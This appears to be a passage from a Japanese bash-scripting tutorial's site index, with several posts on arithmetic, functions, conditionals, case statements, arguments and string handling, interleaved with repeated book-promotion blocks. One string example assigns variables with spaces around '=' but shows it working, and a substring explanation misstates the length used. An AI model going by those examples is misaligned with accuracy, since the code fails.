つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-16-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-16-suzuki/","title":"【１６．文字列の部分文字列を取得する】ざっくりわかる「シェルスクリプト」"},{"content":"変数に2つの数値を追加します 2つの数字を追加します。\nさまざまな方法でbashの算術演算を実行できます。次のスクリプトに、二重角かっこを使用してbashに2つの整数を追加する方法を示します。次のコードを使用して、「add_numbers.sh」という名前のファイルを作成します。2つの整数値がユーザーから取得され、加算の結果が出力されます。\n#!/bin/bash echo \u0026#34;最初の数値を入力\u0026#34;; read x; echo \u0026#34;2番目の数値を入力\u0026#34;; read y; ((sum=x+y)); echo \u0026#34;加算の結果=$sum\u0026#34;; bashコマンドでファイルを実行します。\n$ bash add_numbers.sh 最初の数値を入力 25 2番目の数値を入力 56 加算の結果=81 $ ヒント ((sum=x+y)); 昔の書籍でシェルスクリプトを勉強している人は、驚くかもしれない。だが、今の時代、Bashでは上記のように書く。昔は $ echo `expr 1 + 1`\nこんな書き方をした。現在のBashでは算術演算子が使える。\n以下ににまとめてみた。2重括弧でくくればいい。2重括弧の中に変数を使うことも可能だ。さらに変数は見にくい「$」をつける必要すらない。 $ echo `expr 1+1` # 昔のやり方 $ echo $((5+5)) # 今のやり方 $ echo $((5-5)) $ echo $((5*5)) $ echo $((5/5)) $ echo $((5%5)) # なんと比較演算子もいける！ $ echo $((0==1)) # 等号、結果: 0 $ echo $((0!=1)) # 否定等号、結果: 1 $ echo $((0\u0026lt;1)) # 未満、結果: 1 $ echo $((0\u0026lt;=1)) # 以下、結果: 1 $ echo $((0\u0026gt;1)) # 大なり、結果: 0 $ echo $((0\u0026gt;=1)) # 以上、結果: 0 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-17-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-17-suzuki/","title":"【１７．変数に2つの数値を追加します】ざっくりわかる「シェルスクリプト」"},{"content":"関連記事\nざっくりわかるシェルスクリプト１」\nざっくりわかるシェルスクリプト２」\nざっくりわかるシェルスクリプト３」\n関数を作成する 関数の作成：\n簡単な関数を作成して関数を呼び出す方法を次のスクリプトに示します。\u0026lsquo;function_example.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加します。bashスクリプトで角かっこを使用せずに、名前でのみ関数を呼び出すことができます。\n#!/bin/bash function 関数の名前(){ 処理 } このとき、functionは省略可能です。\n#!/bin/bash 関数の名前(){ 処理 } 関数の呼び出しは、関数を定義した後に関数の名前を書くだけです。\n関数の名前 引数 #!/bin/bash # 関数の定義 function say_hello(){ echo \u0026#34;Hello, world!\u0026#34;; } # # 関数の呼び出し say_hello; ヒント このとき、関数の名前に続けて、引数を書くことができます。関数内では、通常のシェルスクリプトの引数を処理するのと同じように$1、$2、\u0026hellip;という形でアクセスできます。 #!/bin/bash # 関数の定義 function say_hello(){ # 引数を受け取って表示 echo \u0026#34;$1, world!\u0026#34;; } # # 関数の呼び出し 引数を渡す say_hello \u0026#34;Hello\u0026#34;; bashコマンドでファイルを実行します。\n$ bash function_example.sh Hello, world! $ 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-18-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-18-suzuki/","title":"【１８．関数を作成する】ざっくりわかる「シェルスクリプト」"},{"content":"関数パラメーターを使用する パラメータを使用して関数を作成します。\nBashは、関数宣言時に関数パラメーターまたは引数を宣言できません。ただし、他の変数を使用して、関数内でパラメーターを使用できます。関数の呼び出し時に2つの値が渡された場合、値の読み取りには$1と$2の変数が使用されます。\u0026lsquo;function_parameter.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加します。ここで、関数 \u0026lsquo;Rectangle_Area\u0026rsquo;は、パラメーター値に基づいて長方形の面積を計算します。\n#!/bin/bash Rectangle_Area(){ area=$(($1*$2)); echo \u0026#34;面積は : $area\u0026#34;; } Rectangle_Area 10 20; bashコマンドでファイルを実行します。\nbash-5.1$ bash tmp 面積は : 200 bash-5.1$ 戻り値について bashシェルスクリプトには「戻り値」というものは基本的に存在しない。 解決策として関数やコマンドの「実行結果を直接変数に代入する」という手段をとることになる。\n「return」コマンドは存在するが、あくまで終了ステータスを返しているだけで、関数の戻り値を返す機能ではないので注意しよう。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-19-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-19-suzuki/","title":"【１９．関数パラメーターを使用する】ざっくりわかる「シェルスクリプト」"},{"content":"はじめに Bashスクリプトは、シェルコマンドの実行、複数のコマンドの同時実行、管理タスクのカスタマイズ、タスクの自動化の実行など、さまざまな目的に使用できます。したがって、bashプログラミングの基本に関する知識はすべてのLinuxユーザーにとって重要です。この記事は、bashプログラミングの基本的な考え方を理解するのに役立ちます。ここでは、bashスクリプトの一般的な操作のほとんどを、非常に簡単な例で説明します。\nこの記事では、bashプログラミングの次のトピックについて説明します。\nor 条件を if文で使う orロジックでifステートメントを使用する：\n\u0026lsquo;||\u0026lsquo;は、ifステートメントでorロジックを定義するために使用されます。次のコードを使用して「if_with_or.sh」という名前のファイルを作成し、ifステートメントのorロジックの使用を確認します。ここで、nの値はユーザーから取得されます。値が15または45の場合、出力は「ゲームに勝ちました」になります。それ以外の場合、出力は「ゲームに負けました」になります。\n#!/bin/bash echo \u0026#34;数値を入力して下さい。\u0026#34;; read n; if [[ (\u0026#34;$n\u0026#34; -eq 15 || \u0026#34;$n\u0026#34; -eq 45) ]];then echo \u0026#34;ゲームに勝ちました\u0026#34;; else echo \u0026#34;ゲームに負けました\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash if_with_or.sh 数値を入力して下さい。 5 ゲームに負けました $ bash if_with_or.sh 数値を入力して下さい。 45 ゲームに勝ちました bash-5.1$ 比較演算子使用例意味 -n-n 文字列\t文字列の長さが0より大きければ真 -z-z 文字列\t文字列の長さが0であれば真 =文字列A = 文字列B\t文字列Aと文字列Bが等しければ真 !=文字列A != 文字列B\t文字列Aと文字列Bが等しくなければ真 ヒント シェルスクリプトの比較式には「比較演算子」の左右に空白（半角スペース）が必要です（代入とは別）。 また、比較する変数を「ダブルクォーテーション」で囲まないと、変数が空のときに構文エラーとなってしましますので注意してください。 else if と else else ifステートメントの使用：\nelse if条件の使用は、bashでは「elif」を定義します。\u0026rsquo;elseif_example.sh\u0026rsquo;という名前のファイルを作成し、次のスクリプトを追加して、bashスクリプトでelseifがどのように定義されているかを確認します。\n#!/bin/bash echo \u0026#34;あなたのラッキーナンバーを入力して下さい。\u0026#34;; read n; if [ \u0026#34;$n\u0026#34; -eq 101 ];then echo \u0026#34;あなたは一等賞を獲得しました\u0026#34;; elif [ \u0026#34;$n\u0026#34; -eq 510 ];then echo \u0026#34;あなたは二等賞を獲得しました\u0026#34;; elif [ \u0026#34;$n\u0026#34; -eq 999 ];then echo \u0026#34;あなたは三等賞を獲得しました\u0026#34;; else echo \u0026#34;すみません、またチャレンジして下さい\u0026#34;; fi bashコマンドでファイルを実行します。\nbash$ bash elseif_example.sh あなたのラッキーナンバーを入力して下さい。 101 あなたは一等賞を獲得しました bash$ bash elseif_example.sh あなたのラッキーナンバーを入力して下さい。 999 あなたは三等賞を獲得しました bash$ bash elseif_example.sh あなたのラッキーナンバーを入力して下さい。 100 すみません、またチャレンジして下さい bash$ bash elseif_example.sh $ 比較演算子使用例意味 -n-n 文字列\t文字列の長さが0より大きければ真 -z-z 文字列\t文字列の長さが0であれば真 =文字列A = 文字列B\t文字列Aと文字列Bが等しければ真 !=文字列A != 文字列B\t文字列Aと文字列Bが等しくなければ真 ヒント シェルスクリプトの比較式には「比較演算子」の左右に空白（半角スペース）が必要です（代入とは別）。 また、比較する変数を「ダブルクォーテーション」で囲まないと、変数が空のときに構文エラーとなってしましますので注意してください。 case 文 caseステートメントの使用：\ncaseステートメントは、if-elseif-elseステートメントの代わりに使用されます。このステートメントの開始ブロックと終了ブロックは、「case」と「esac」によって定義されます。\u0026lsquo;case_example.sh\u0026rsquo;という名前の新しいファイルを作成し、次のスクリプトを追加します。次のスクリプトの出力は、例として前のelseと同じになります。\n#!/bin/bash echo \u0026#34;あなたのラッキーナンバーを入力して下さい。\u0026#34;; read n; case \u0026#34;$n\u0026#34; in 101) echo \u0026#34;あなたは一等賞を獲得しました\u0026#34; ;; 510) echo \u0026#34;あなたは二等賞を獲得しました\u0026#34; ;; 999) echo \u0026#34;あなたは三等賞を獲得しました\u0026#34; ;; *) echo \u0026#34;すみません、またチャレンジして下さい\u0026#34; esac bashコマンドでファイルを実行します。\nbash$ bash case_example.sh あなたのラッキーナンバーを入力して下さい。 101 あなたは一等賞を獲得しました bash$ bash case_example.sh あなたのラッキーナンバーを入力して下さい。 510 あなたは二等賞を獲得しました bash$ bash case_example.sh あなたのラッキーナンバーを入力して下さい。 999 あなたは三等賞を獲得しました bash$ bash case_example.sh あなたのラッキーナンバーを入力して下さい。 777 すみません、またチャレンジして下さい ヒント case文の終わりには esac を指定します。 コマンドラインから引数を取得 コマンドラインから引数を取得：\nBashスクリプトは、他のプログラミング言語と同様に、コマンドライン引数から入力を読み取ることができます。たとえば、$1と$2の変数は、最初と2番目のコマンドライン引数を読み取るために使用されます。「command_line.sh」という名前のファイルを作成し、次のスクリプトを追加します。次のスクリプトによって読み取られた2つの引数値は、引数の総数と引数値を出力として出力します。\n#!/bin/bash echo \u0026#34;引数の数 : $#\u0026#34;; echo \u0026#34;一つ目の引数 = $1\u0026#34;; echo \u0026#34;二つ目の引数 = $2\u0026#34;; bashコマンドでファイルを実行します。\n$ bash command_line.sh apple windows 引数の数 : 2 一つ目の引数 = apple 二つ目の引数 = windows $ ヒント echo の引数として変数を渡すときは、\u0026quot;$1\u0026quot; のようにダブルクォートで囲む癖をつけます。 $1 のようにダブルクォートで囲まずに変数をそのまま記述してしまうと、値として連続するスペースが含まれていたときに1つのスペースにまとめられてしまいます。また、値が入っていない場合に、正しく処理ができなくなります。 シェルスクリプトの変数はほとんどの場合は \u0026ldquo;$value\u0026rdquo; と囲みます。 名前を使用してコマンドラインから引数を取得する コマンドラインから名前付きの引数を取得：\n名前付きのコマンドライン引数を読み取る方法を示します。\u0026lsquo;command_line_names.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加します。ここで、XとYの2つの引数がこのスクリプトによって読み取られ、XとYの合計が出力されます。\n#!/bin/bash for arg in \u0026#34;$@\u0026#34;;do index=$(echo $arg | cut -f1 -d=); val=$(echo $arg | cut -f2 -d=); case $index in X) x=$val;; Y) y=$val;; *) esac done ((result=x+y)); echo \u0026#34;X+Y=$result\u0026#34;; bashコマンドで二つのコマンドライン引数を使用して、ファイルを実行します。\n$ bash command_line_names.sh X=45 Y=30 X+Y=75 $ ヒント case文で入力された文字列の大文字と小文字に対応する。 または文字列に対応する場合は以下のソースを見て欲しい。 レベルアップしたソースコードはささいな気遣いから生まれる #! /bin/bash case \u0026#34;$1\u0026#34; in [Yy]|\u0026#34;yes\u0026#34;)\t#Y、yまたはyesという文字列 echo \u0026#34;YES\u0026#34; echo \u0026#34;OK\u0026#34; ;; [Nn]|\u0026#34;no\u0026#34;)\t#N、nまたはnoという文字列 echo \u0026#34;NO\u0026#34; ;; *) echo \u0026#34;undefined\u0026#34;;; esac 変数に2つの文字列を組み合わせる 文字列変数を組み合わせる：\n文字列変数はbashで簡単に組み合わせることができます。「string_combine.sh」という名前のファイルを作成し、次のスクリプトを追加して、変数を一緒に配置するか、「+」演算子を使用して、bashで文字列変数を組み合わせる方法を確認します。\n#!/bin/bash string1=\u0026#34;Apple\u0026#34;; string2=\u0026#34;Mac OS\u0026#34;; echo \u0026#34;$string1 $string2\u0026#34;; string3=\u0026#34;$string1 $string2\u0026#34;; string3+=\u0026#34; は、とても優れたＯＳです。\u0026#34; ; echo $string3; bashコマンドでファイルを実行します。\n$ bash string_combine.sh Apple Mac OS Apple Mac OS は、とても優れたＯＳです。 $ ヒント Bash は += 演算子を用いて文字列を連結することもできます。単純に a+=b とすると、a=a+b と理解することができます。 変数と文字列の結合は変数を{} でくくります。以下のソースを見て下さい。\n#!/bin/sh str1 = \u0026#34;Shell script\u0026#34; str = \u0026#34;${str1} is intersting!!\u0026#34; echo $str $ bash string_example2.sh $ Shell script is interesting!! $ 文字列の部分文字列を取得する 文字列の部分文字列を取得します。\n他のプログラミング言語と同様に、bashには文字列データから値を切り取る組み込み関数はありません。ただし、次のスクリプトに示すbashで、別の方法で部分文字列のタスクを実行できます。スクリプトをテストするには、次のコードを使用して「substring_example.sh」という名前のファイルを作成します。ここで、値6は部分文字列が開始する開始点を示し、5は部分文字列の長さを示します。\n#!/bin/bash Str=\u0026#34;Learn Bash from NLP\u0026#34;; subStr=${Str:6:4}; echo \u0026#34;$subStr\u0026#34;; bashコマンドでファイルを実行します。\n$ bash substring_example.sh Bash $ ヒント 基本パターンは以下の通り ${パラメータ:オフセット:長さ}\n: Bashでの文字列の切り出しはかなりの頻度で使います。 知っているのと知らないのとでは、苦労が違ってきます。 具体例を以下にしめします。 #!/bin/bash HOGE=\u0026#34;abcdef\u0026#34; # オフセット位置から長さ分を取得 echo ${HOGE:0:2} # -\u0026gt; ab echo ${HOGE:2:2} # -\u0026gt; cd echo ${HOGE:4:2} # -\u0026gt; ef # 長さを省略した場合はオフセットから最後まで出力 echo ${HOGE:2} # -\u0026gt; cdef # 長さにマイナスを指定した場合は最後からマイナス分引いた位置までの長さになる echo ${HOGE:0:-2} # -\u0026gt; abcd # オフセットの位置にマイナスを指定した場合は文法として別のパラメータ展開になる(デフォルト値の指定) # 指定した変数が空文字列の場合は右に指定した文字が入る echo ${HOGE:-2} # -\u0026gt; abcdef HOGE= echo ${HOGE:-2} # -\u0026gt; 2 #!/bin/bash HOGE=hoge.tar.bz2 echo ${HOGE} # -\u0026gt; hoge.tar.bz2 # 最短除外 echo ${HOGE%.*} # -\u0026gt; hoge.tar # 最長除外 echo ${HOGE%%.*} # -\u0026gt; hoge #!/bin/bash HOGE=/home/user/hoge echo ${HOGE} # -\u0026gt; /home/user/hoge # 最短除外 echo ${HOGE#*/} # -\u0026gt; home/user/hoge # 最長除外 echo ${HOGE##*/} # -\u0026gt; hoge 変数に2つの数値を追加します 2つの数字を追加します。\nさまざまな方法でbashの算術演算を実行できます。次のスクリプトに、二重角かっこを使用してbashに2つの整数を追加する方法を示します。次のコードを使用して、「add_numbers.sh」という名前のファイルを作成します。2つの整数値がユーザーから取得され、加算の結果が出力されます。\n#!/bin/bash echo \u0026#34;最初の数値を入力\u0026#34;; read x; echo \u0026#34;2番目の数値を入力\u0026#34;; read y; ((sum=x+y)); echo \u0026#34;加算の結果=$sum\u0026#34;; bashコマンドでファイルを実行します。\n$ bash add_numbers.sh 最初の数値を入力 25 2番目の数値を入力 56 加算の結果=81 $ ヒント ((sum=x+y)); 昔の書籍でシェルスクリプトを勉強している人は、驚くかもしれない。だが、今の時代、Bashでは上記のように書く。昔は $ echo `expr 1 + 1`\nこんな書き方をした。現在のBashでは算術演算子が使える。\n以下ににまとめてみた。2重括弧でくくればいい。2重括弧の中に変数を使うことも可能だ。さらに変数は見にくい「$」をつける必要すらない。 $ echo `expr 1+1` # 昔のやり方 $ echo $((5+5)) # 今のやり方 $ echo $((5-5)) $ echo $((5*5)) $ echo $((5/5)) $ echo $((5%5)) # なんと比較演算子もいける！ $ echo $((0==1)) # 等号、結果: 0 $ echo $((0!=1)) # 否定等号、結果: 1 $ echo $((0\u0026lt;1)) # 未満、結果: 1 $ echo $((0\u0026lt;=1)) # 以下、結果: 1 $ echo $((0\u0026gt;1)) # 大なり、結果: 0 $ echo $((0\u0026gt;=1)) # 以上、結果: 0 関数を作成する 関数の作成：\n簡単な関数を作成して関数を呼び出す方法を次のスクリプトに示します。\u0026lsquo;function_example.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加します。bashスクリプトで角かっこを使用せずに、名前でのみ関数を呼び出すことができます。\n#!/bin/bash function 関数の名前(){ 処理 } このとき、functionは省略可能です。\n#!/bin/bash 関数の名前(){ 処理 } 関数の呼び出しは、関数を定義した後に関数の名前を書くだけです。\n関数の名前 引数 #!/bin/bash # 関数の定義 function say_hello(){ echo \u0026#34;Hello, world!\u0026#34;; } # # 関数の呼び出し say_hello; ヒント このとき、関数の名前に続けて、引数を書くことができます。関数内では、通常のシェルスクリプトの引数を処理するのと同じように$1、$2、\u0026hellip;という形でアクセスできます。 関数パラメーターを使用する パラメータを使用して関数を作成します。\nBashは、関数宣言時に関数パラメーターまたは引数を宣言できません。ただし、他の変数を使用して、関数内でパラメーターを使用できます。関数の呼び出し時に2つの値が渡された場合、値の読み取りには$1と$2の変数が使用されます。\u0026lsquo;function_parameter.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加します。ここで、関数 \u0026lsquo;Rectangle_Area\u0026rsquo;は、パラメーター値に基づいて長方形の面積を計算します。\n#!/bin/bash Rectangle_Area(){ area=$(($1*$2)); echo \u0026#34;面積は : $area\u0026#34;; } Rectangle_Area 10 20; bashコマンドでファイルを実行します。\nbash-5.1$ bash tmp 面積は : 200 bash-5.1$ 戻り値について bashシェルスクリプトには「戻り値」というものは基本的に存在しない。 解決策として関数やコマンドの「実行結果を直接変数に代入する」という手段をとることになる。\n「return」コマンドは存在するが、あくまで終了ステータスを返しているだけで、関数の戻り値を返す機能ではないので注意しよう。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 